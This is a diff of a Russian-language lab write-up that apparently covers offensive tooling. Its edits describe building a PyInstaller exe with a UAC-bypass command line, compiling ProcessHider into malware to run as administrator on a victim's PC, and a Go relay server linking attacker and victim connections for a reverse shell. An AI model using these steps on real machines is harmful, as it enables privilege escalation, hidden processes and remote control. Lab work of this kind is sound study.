@@ -10,9 +10,9 @@ pip install pyinstaller
 pyinstaller --onefile main.py
 ```
 
-В каталоге dist нас будет ожидать exe файл
+В каталоге dist нас будет ожидать exe файл, который уже можно запусить на зараженном ПК.
 
-далее запускаем его:
+далее запускаем полученный exe файл:
 ```bash
 main --use uac --id 2 --payload c:\\windows\\system32\\cmd.exe
 ```
@@ -25,12 +25,12 @@ main --use uac --id 2 --payload c:\\windows\\system32\\cmd.exe
 Скачиваем проект [отсюда](https://github.com/kernelm0de/ProcessHider).
 1. Устанавливаем набор инструментов от 2015 года, чтобы собрать проект.
 ![Alt text](src/image-1.png)
-2. Перенести все файлы из include в папку ProcessHider и поправить импорты в main.cpp в той же папке
+2. Переносим все файлы из include в папку ProcessHider и поправляем импорты в main.cpp в той же папке
 ![Alt text](src/image-3.png)
-3. Открываем проект и обновляем **target platform version до 10**.
+3. Открываем проект и обновляем **target platform version** до 10.
 ![Alt text](src/image-2.png)
 
-Cобираем проект и запускаем exe от имени администратора
+Cобираем проект и получаем вредонос, который можно запустить на ПК жертвы от имени администратора, напрмимер, с использованием программы в задаче 2.1.
 
 ![Alt text](src/poc2.2.gif)
 
@@ -222,6 +222,7 @@ func main() {
 	connAttack, _ := ln.Accept()
 	fmt.Println("Waiting for victim side")
 	connVictim, _ := ln.Accept()
+	fmt.Println("Server started")
 
 	wg := sync.WaitGroup{}
 	wg.Add(2)
@@ -238,7 +239,7 @@ func main() {
 	wg.Wait()
 }
 ```
-
+![Alt text](src/revsh.png)
 
 # Задача 3
 
